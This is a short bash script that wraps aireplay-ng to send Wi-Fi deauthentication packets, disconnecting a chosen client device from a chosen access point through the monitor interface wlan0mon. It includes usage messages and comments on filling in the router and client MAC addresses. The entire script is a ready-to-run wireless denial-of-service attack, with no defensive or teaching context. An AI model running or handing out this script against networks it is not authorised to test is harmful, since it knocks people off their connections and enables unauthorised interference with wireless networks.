#!/bin/bash
# aireplay-ng --deauth [how many packets to send] -a [AP MAC ADDRESS] -c [CLIENT MAC ADDRESS]
# **AP is the router
# **CLIENT is the device to kick off (station column)

if [ $1 == 'h' ]; then
	echo "Usage: [dauth_pkts#] AP_MAC_ADDRESS CLIENT_MAC"
	echo "Assumes monitor interface is wlan0mon"
elif [ $# != 3 ]; then
	echo "Usage: [dauth_pkts#] AP_MAC_ADDRESS CLIENT_MAC"
	echo "Assumes monitor interface is wlan0mon"
else
	aireplay-ng --deauth $1 -a $2 -c $3 wlan0mon
fi
